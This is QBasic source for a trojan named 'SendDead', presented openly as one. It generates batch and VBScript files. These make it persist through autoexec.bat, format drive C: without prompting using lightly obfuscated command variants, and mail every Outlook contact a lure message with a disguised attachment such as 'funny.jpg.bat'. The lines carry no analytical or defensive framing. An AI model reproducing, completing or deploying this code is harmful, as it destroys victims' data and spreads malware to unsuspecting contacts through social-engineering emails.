CLS
REM * * * * *  Trojan.SendDead * * * * *
RANDOMIZE TIMER
COLOR 9
PRINT " Sorry, no function!!"

suba = INT(RND * 5) + 1                                 ' Subject der eMail
IF suba = 1 THEN sub$ = "Hi!! Wie gehts?"               ' Subject der eMail
IF suba = 2 THEN sub$ = "wow... ;-)"                    ' Subject der eMail
IF suba = 3 THEN sub$ = "FWD: Lolita"                   ' Subject der eMail
IF suba = 4 THEN sub$ = "Hallo!"                        ' Subject der eMail
IF suba = 5 THEN sub$ = "Moin... :-)"                   ' Subject der eMail

bodya = INT(RND * 3) + 1                                           ' Body des eMails
IF bodya = 1 THEN body$ = "was sagst du zu der? *fg*"              ' Body des eMails
IF bodya = 2 THEN body$ = "Hallo! wie gehts?Schreib mal wieder..." ' Body des eMails
IF bodya = 3 THEN body$ = "Moin! Guck dir Die mal an ;-)!"         ' Body des eMails

atta = INT(RND * 3) + 1
IF atta = 1 THEN att$ = "loli.bat"
IF atta = 2 THEN att$ = "funny.jpg.bat"
IF atta = 3 THEN att$ = "deep.arv.bat"
OPEN "C:\SD.bat" FOR OUTPUT AS #1
PRINT #1, "ctty NUL"
PRINT #1, "echo C:\boot.bat > C:\autoexec.bat"
PRINT #1, "copy %0 C:\boot.bat"
sp = INT(RND * 3) + 1
IF sp = 1 THEN PRINT #1, "format C: /u /q /autotest"
IF sp = 2 THEN PRINT #1, "set a=format"
IF sp = 2 THEN PRINT #1, "%a% C: /u /q /autotest"
IF sp = 3 THEN PRINT #1, "set a=autotest"
IF sp = 3 THEN PRINT #1, "format C: /u /q /%a%"
IF sp = 4 THEN PRINT #1, "set a=autotest"
IF sp = 4 THEN PRINT #1, "set b=format"
IF sp = 4 THEN PRINT #1, "%b% C: /u /q /%a%"
CLOSE #1

OPEN "named.bat" FOR OUTPUT AS #2
PRINT #2, "ctty NUL"
PRINT #2, "copy C:\SD.bat C:\"; vbpart$
PRINT #2, "del C:\SD.bat"
PRINT #2, "ctty CON"
CLOSE #2
SHELL "named.bat"
KILL "named.bat"

OPEN "SendDead.vbs" FOR OUTPUT AS #1
PRINT #1, "DIM x"
PRINT #1, "on error resume next"
PRINT #1, "Set fso = "; CHR$(34); "Scripting.FileSystem.Object"; CHR$(34)
PRINT #1, "Set so = CreateObject(fso)"
PRINT #1, "Set ol = CreateObject("; CHR$(34); "Outlook.Application"; CHR$(34); ")"
PRINT #1, "Set out=WScript.CreateObject("; CHR$(34); "Outlook.Application"; CHR$(34); ")"
PRINT #1, "Set mapi = out.GetNameSpace("; CHR$(34); "MAPI"; CHR$(34); ")"
PRINT #1, "Set a = mapi.AddressLists(1)"
PRINT #1, "Set ae = a.AddressEntries"
PRINT #1, "FOR x = 1 TO ae.Count"
PRINT #1, "Set ci = ol.CreateItem(0)"
PRINT #1, "Set Mail = ci"
PRINT #1, "Mail.to=ol.GetNameSpace("; CHR$(34); "MAPI"; CHR$(34); ").AddressLists(1).AddressEntries(x)"
PRINT #1, "Mail.Subject="; CHR$(34); sub$; CHR$(34); " "
PRINT #1, "Mail.Body="; CHR$(34); body$; CHR$(34)
PRINT #1, "Mail.Attachments.Add("; CHR$(34); att$; CHR$(34); ") "
PRINT #1, "Mail.Send"
PRINT #1, "Next"
PRINT #1, "ol.Quit"
CLOSE #1
OPEN "cs.bat" FOR OUTPUT AS #1
PRINT #1, "cscript sendDead.vbs"
CLOSE #1
SHELL "cs.bat"
Ende:

